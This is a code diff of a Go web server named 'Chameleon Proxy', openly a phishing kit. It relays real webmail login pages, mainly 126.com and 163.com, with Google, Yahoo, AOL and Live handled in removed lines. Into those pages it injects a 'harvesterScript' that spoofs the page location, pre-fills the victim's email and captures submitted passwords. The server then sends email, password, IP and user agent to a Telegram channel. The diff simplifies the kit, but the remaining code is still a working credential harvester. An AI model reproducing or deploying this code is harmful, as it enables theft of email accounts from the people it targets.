@@ -34,129 +34,87 @@ var store = &SessionStore{
 	sessions: make(map[string]*SessionData),
 }
 
-// THE INJECTED SCRIPT: Patching DOM, Fetch, XHR, URL, and Encoding
 const harvesterScript = `
 <script>
-// 1. PATCH URL (Prevent React Crashes)
-const OriginalURL = window.URL;
-window.URL = function(url, base) {
-    try { return new OriginalURL(url, base || window.location.origin); } 
-    catch (e) {
-        if (typeof url === 'string' && !url.startsWith('http')) {
-            return new OriginalURL('https://' + window._targetDomain + '/' + url.replace(/^\/+/, ''));
-        }
-        return new OriginalURL('https://' + window._targetDomain + '/');
-    }
-};
-window.URL.prototype = OriginalURL.prototype;
-
-// 2. PATCH DOMAIN (Bypass 126.com hostname check)
-Object.defineProperty(window, 'location', {
-    value: new Proxy(window.location, {
-        get: function(target, prop) {
-            if (prop === 'hostname') return window._targetDomain;
-            if (prop === 'origin') return 'https://' + window._targetDomain;
-            if (prop === 'host') return window._targetDomain;
-            if (prop === 'href') return 'https://' + window._targetDomain + '/login';
-            const val = target[prop];
-            return typeof val === 'function' ? val.bind(target) : val;
-        }
-    })
-});
-
-// 3. FORCE UTF-8 ENCODING
-document.addEventListener('DOMContentLoaded', function() {
-    document.charset = "UTF-8";
-    var metas = document.getElementsByTagName('meta');
-    for (var i = 0; i < metas.length; i++) {
-        if (metas[i].getAttribute('charset')) metas[i].setAttribute('charset', 'UTF-8');
-        if (metas[i].getAttribute('http-equiv') === 'Content-Type') {
-            metas[i].setAttribute('content', 'text/html; charset=UTF-8');
-        }
-    }
-});
-
-// 4. BYPASS CORS (Intercept Fetch and XHR)
-const originalFetch = window.fetch;
-window.fetch = function() {
-    let args = arguments;
-    if (args[1] && args[1].headers) {
-        // Remove Origin header to bypass CORS checks
-        delete args[1].headers['Origin'];
-    } else if (args[1]) {
-        args[1].headers = {};
-    } else {
-        args[1] = { headers: {} };
-    }
-    return originalFetch.apply(this, args);
-};
-
-const originalXHR = window.XMLHttpRequest;
-window.XMLHttpRequest = function() {
-    let xhr = new originalXHR();
-    let originalOpen = xhr.open;
-    xhr.open = function(method, url, async, user, password) {
-        // Force CORS bypass on the server for all requests
-        return originalOpen.call(this, method, url, async, user, password);
-    };
-    return xhr;
-};
-
-// 5. AUTO-FILL LOGIC
-var fillAttempts = 0;
-var fillInterval = setInterval(function() {
+(function() {
     var email = window._targetEmail;
-    if (!email || fillAttempts > 20) { clearInterval(fillInterval); return; }
-
-    var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"], input[name="account_name"], input[id="mailInput"]');
+    var targetDomain = window._targetDomain;
     
-    if (inputs.length > 0) {
-        for (var i = 0; i < inputs.length; i++) {
-            var input = inputs[i];
-            if (input.offsetParent !== null && input.value === "") {
-                let setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                setter.call(input, email);
-                input.dispatchEvent(new Event('input', { bubbles: true }));
-                input.dispatchEvent(new Event('change', { bubbles: true }));
-                input.focus();
-                clearInterval(fillInterval);
-                return;
+    // 1. HOSTNAME & CORS BYPASS (Proxy Object)
+    if (targetDomain) {
+        try {
+            var originalLocation = window.location;
+            var locationProxy = new Proxy(originalLocation, {
+                get: function(target, prop) {
+                    if (prop === 'hostname' || prop === 'host') return targetDomain;
+                    if (prop === 'origin') return 'https://' + targetDomain;
+                    if (prop === 'href') return 'https://' + targetDomain + '/login';
+                    var val = target[prop];
+                    return typeof val === 'function' ? val.bind(target) : val;
+                }
+            });
+            Object.defineProperty(window, 'location', { get: function() { return locationProxy; } });
+        } catch(e) { console.log("Location patch failed:", e); }
+
+        // Patch Fetch
+        const originalFetch = window.fetch;
+        window.fetch = function(urlOrRequest, init) {
+            let url = typeof urlOrRequest === 'string' ? urlOrRequest : urlOrRequest.url;
+            if (url && (url.includes('countly') || url.includes('127.net'))) {
+                if (!init) init = {};
+                init.credentials = 'include';
+                init.mode = 'no-cors'; 
+            }
+            return originalFetch.call(this, urlOrRequest, init);
+        };
+    }
+
+    // 2. AUTO-FILL LOGIC
+    var fillAttempts = 0;
+    var fillInterval = setInterval(function() {
+        if (!email || fillAttempts > 20) { clearInterval(fillInterval); return; }
+
+        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"], input[id="mailInput"]');
+        if (inputs.length > 0) {
+            for (var i = 0; i < inputs.length; i++) {
+                var input = inputs[i];
+                if (input.offsetParent !== null && input.value === "") {
+                    let setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+                    setter.call(input, email);
+                    input.dispatchEvent(new Event('input', { bubbles: true }));
+                    input.dispatchEvent(new Event('change', { bubbles: true }));
+                    input.focus();
+                    clearInterval(fillInterval);
+                    return;
+                }
             }
         }
-    }
-    fillAttempts++;
-}, 500);
+        fillAttempts++;
+    }, 500);
 
-// 6. HARVEST SUBMISSIONS
-function sendHarvest(data) {
-    fetch(window.location.origin + '/api/harvest', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: data
-    }).catch(() => {});
-}
+    // 3. PASSWORD HARVESTING
+    document.addEventListener('submit', function(e) {
+        const form = e.target;
+        const formData = new FormData(form);
+        const params = new URLSearchParams();
+        let hasEmail = false;
+        let hasPassword = false;
 
-document.addEventListener('submit', function(e) {
-    const form = e.target;
-    const formData = new FormData(form);
-    const params = new URLSearchParams();
-    let hasEmail = false;
-    let hasPassword = false;
-
-    for (let [key, value] of formData.entries()) {
-        params.append(key, value);
-        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login') || key.toLowerCase().includes('ident')) {
-            hasEmail = true;
+        for (let [key, value] of formData.entries()) {
+            params.append(key, value);
+            if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login')) hasEmail = true;
+            if (key.toLowerCase().includes('pass')) hasPassword = true;
         }
-        if (key.toLowerCase().includes('pass')) {
-            hasPassword = true;
-        }
-    }
 
-    if (hasEmail && hasPassword) {
-        sendHarvest(params.toString() + '&type=login');
-    }
-}, false);
+        if (hasEmail && hasPassword) {
+            fetch(window.location.origin + '/api/harvest', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: params.toString() + '&type=login'
+            }).catch(() => {});
+        }
+    }, true);
+})();
 </script>
 `
 
@@ -164,33 +122,17 @@ const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style
 setTimeout(()=>{
     var hash = window.location.hash;
     var email = "";
-    
     if (hash && hash.length > 1) {
         var raw = hash.substring(1); 
-
         if (raw.startsWith('t=')) {
             var b64 = raw.split('t=')[1];
             try { email = atob(b64); } catch(e) { email = b64; }
-        } else {
-            if (raw.includes('[[-Email-]]')) { email = raw.replace('[[-Email-]]', 'test@126.com'); } 
-            else if (raw.includes('[[-email-]]')) { email = raw.replace('[[-email-]]', 'test@126.com'); }
-            else { email = raw; }
-            var b64Email = btoa(email);
-            window.history.replaceState({}, '', '/#?t=' + b64Email);
-        }
-
+        } else { email = raw; }
         window._targetEmail = email;
-        
         fetch('/api/fetch?email=' + encodeURIComponent(email))
             .then(r => r.text())
-            .then(html => {
-                document.open();
-                document.write(html);
-                document.close();
-            });
-    } else {
-        document.body.innerHTML = "<h3>No account provided.</h3>";
-    }
+            .then(html => { document.open(); document.write(html); document.close(); });
+    } else { document.body.innerHTML = "<h3>No account provided.</h3>"; }
 }, 1000);
 </script></body></html>`
 
@@ -202,21 +144,11 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		c.String(200, loaderHTML)
 	})
 
-	r.NoRoute(func(c *gin.Context) {
-		if strings.Contains(c.Request.URL.Path, "cgi-sys") || strings.Contains(c.Request.URL.Path, "defaultwebpage") {
-			c.Redirect(302, "/")
-			return
-		}
-		c.Header("Content-Type", "text/html")
-		c.String(200, loaderHTML)
-	})
-
 	r.GET("/api/fetch", func(c *gin.Context) {
 		email := c.Query("email")
 		if b64, err := base64.StdEncoding.DecodeString(email); err == nil && strings.Contains(string(b64), "@") {
 			email = string(b64)
 		}
-
 		if email == "" {
 			c.String(400, "Missing email")
 			return
@@ -225,8 +157,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		targetBase := GetTargetDomain(email)
 		parsedTarget, _ := url.Parse(targetBase)
 		targetDomain := parsedTarget.Host
-
-		log.Printf("[PROXY] Fetching for %s from %s", email, targetBase)
 
 		jar, _ := cookiejar.New(nil)
 		proxyClient := &http.Client{
@@ -238,20 +168,12 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			},
 		}
 
-		req, err := http.NewRequest("GET", targetBase, nil)
-		if err != nil {
-			c.String(500, "Request Error")
-			return
-		}
-
+		req, _ := http.NewRequest("GET", targetBase, nil)
 		req.Header.Set("Accept-Encoding", "identity")
 		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
-		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
-		req.Header.Set("Accept-Language", "en-US,en;q=0.9,zh-CN,zh;q=0.8")
 
 		resp, err := proxyClient.Do(req)
 		if err != nil {
-			log.Printf("Proxy Error: %v", err)
 			c.String(502, "Error: %v", err)
 			return
 		}
@@ -259,74 +181,35 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		var bodyReader io.Reader = resp.Body
 		if resp.Header.Get("Content-Encoding") == "gzip" {
-			gzipReader, err := gzip.NewReader(resp.Body)
-			if err == nil {
-				defer gzipReader.Close()
-				bodyReader = gzipReader
-			}
+			gzipReader, _ := gzip.NewReader(resp.Body)
+			defer gzipReader.Close()
+			bodyReader = gzipReader
 		}
-
 		bodyBytes, _ := io.ReadAll(bodyReader)
 
-		if strings.Contains(targetBase, "126.com") || strings.Contains(targetBase, "163.com") || strings.Contains(targetBase, "sina.com") || strings.Contains(strings.ToLower(resp.Header.Get("Content-Type")), "gbk") {
+		// Encoding Fix
+		if strings.Contains(targetBase, "126.com") || strings.Contains(targetBase, "163.com") {
 			reader := transform.NewReader(bytes.NewReader(bodyBytes), simplifiedchinese.GBK.NewDecoder())
 			if decoded, err := io.ReadAll(reader); err == nil {
 				bodyBytes = decoded
 			}
 		}
-
 		bodyStr := string(bodyBytes)
 
-		reDocWrite := regexp.MustCompile(`(?i)<script[^>]*>.*?document\.write.*?<\/script>`)
-		bodyStr = reDocWrite.ReplaceAllString(bodyStr, "")
-
+		// Force UTF-8 Meta
 		reMeta := regexp.MustCompile(`(?i)<meta[^>]*charset=["']?gbk["']?[^>]*>`)
 		bodyStr = reMeta.ReplaceAllString(bodyStr, `<meta charset="utf-8">`)
 		bodyStr = strings.ReplaceAll(bodyStr, "charset=gbk", "charset=utf-8")
-		bodyStr = strings.ReplaceAll(bodyStr, "charset=\"gbk\"", "charset=\"utf-8\"")
-		bodyStr = strings.ReplaceAll(bodyStr, "charset='gbk'", "charset='utf-8'")
 
-		reSW := regexp.MustCompile(`(?i)navigator\.serviceWorker\.register\(.*?\)`)
-		bodyStr = reSW.ReplaceAllString(bodyStr, `(function(){ return Promise.resolve(); })()`)
-
-		reIframe := regexp.MustCompile(`(?i)<iframe(.*?)>`)
-		bodyStr = reIframe.ReplaceAllStringFunc(bodyStr, func(m string) string {
-			m = strings.ReplaceAll(m, `sandbox=""`, "")
-			m = strings.ReplaceAll(m, `sandbox="allow-scripts allow-same-origin"`, "")
-			m = strings.ReplaceAll(m, `sandbox="allow-scripts"`, "")
-			m = strings.ReplaceAll(m, `sandbox`, "")
-			return m
-		})
-
-		bodyStr = strings.ReplaceAll(bodyStr, "https://"+targetDomain, c.Request.Host+"/proxy")
-		bodyStr = strings.ReplaceAll(bodyStr, "http://"+targetDomain, c.Request.Host+"/proxy")
-		bodyStr = strings.ReplaceAll(bodyStr, "https://"+targetDomain+"/", c.Request.Host+"/proxy/")
-
+		// Inject Scripts
 		baseTag := `<base href="` + targetBase + `">`
-		// Inject the target domain into the window object for our DOM patch
 		emailScript := `<script>window._targetEmail = "` + email + `"; window._targetDomain = "` + targetDomain + `";</script>`
-
 		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag+"\n"+emailScript, 1)
 		bodyStr = strings.Replace(bodyStr, "</body>", harvesterScript+"</body>", 1)
 
+		// Final Headers
 		c.Header("Content-Type", "text/html; charset=utf-8")
 		c.Header("Access-Control-Allow-Origin", "*")
-		c.Header("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval'; frame-ancestors *")
-
-		for _, cookie := range resp.Cookies() {
-			newCookie := &http.Cookie{
-				Name:     cookie.Name,
-				Value:    cookie.Value,
-				Path:     "/",
-				Domain:   "",
-				MaxAge:   3600 * 24,
-				HttpOnly: false,
-				Secure:   false,
-				SameSite: http.SameSiteNoneMode,
-			}
-			http.SetCookie(c.Writer, newCookie)
-		}
-
 		c.String(resp.StatusCode, bodyStr)
 	})
 
@@ -334,85 +217,18 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		c.Request.ParseForm()
 		email := c.PostForm("email")
 		password := c.PostForm("password")
-		harvestType := c.PostForm("type")
 
 		if email == "" {
 			email = c.PostForm("username")
 		}
-		if email == "" {
-			email = c.PostForm("loginfmt")
-		}
 		if password == "" {
 			password = c.PostForm("passwd")
-		}
-		if password == "" {
-			password = c.PostForm("pwd")
 		}
 
 		ip := c.ClientIP()
 		ua := c.GetHeader("User-Agent")
-
-		if harvestType == "email_only" {
-			SendTelegramMessage(cfg, FormatLoginAlert(email, "[Waiting for password...]", ip, ua))
-		} else {
-			SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, ua))
-		}
-
+		SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, ua))
 		c.JSON(200, gin.H{"status": "ok"})
-	})
-
-	r.Any("/proxy/*filepath", func(c *gin.Context) {
-		filepath := strings.TrimPrefix(c.Param("filepath"), "/")
-		referer := c.GetHeader("Referer")
-		targetDomain := "https://accounts.google.com/"
-
-		if strings.Contains(referer, "126.com") {
-			targetDomain = "https://mail.126.com/"
-		} else if strings.Contains(referer, "163.com") {
-			targetDomain = "https://mail.163.com/"
-		} else if strings.Contains(referer, "yahoo.com") {
-			targetDomain = "https://login.yahoo.com/"
-		} else if strings.Contains(referer, "aol.com") {
-			targetDomain = "https://login.aol.com/"
-		} else if strings.Contains(referer, "live.com") {
-			targetDomain = "https://login.live.com/"
-		} else if strings.Contains(referer, "networksolutions.com") {
-			targetDomain = "https://www.networksolutions.com/my-account/login"
-		}
-
-		fullURL := targetDomain + filepath
-
-		outReq, err := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)
-		if err != nil {
-			c.String(502, "Bad Request")
-			return
-		}
-
-		for k, v := range c.Request.Header {
-			for _, val := range v {
-				outReq.Header.Add(k, val)
-			}
-		}
-
-		client := &http.Client{
-			Timeout:   15 * time.Second,
-			Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
-		}
-
-		resp, err := client.Do(outReq)
-		if err == nil {
-			defer resp.Body.Close()
-			for k, v := range resp.Header {
-				for _, val := range v {
-					c.Writer.Header().Add(k, val)
-				}
-			}
-			c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
-			c.Writer.WriteHeader(resp.StatusCode)
-			io.Copy(c.Writer, resp.Body)
-		} else {
-			c.String(502, "Upstream Error")
-		}
 	})
 
 	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
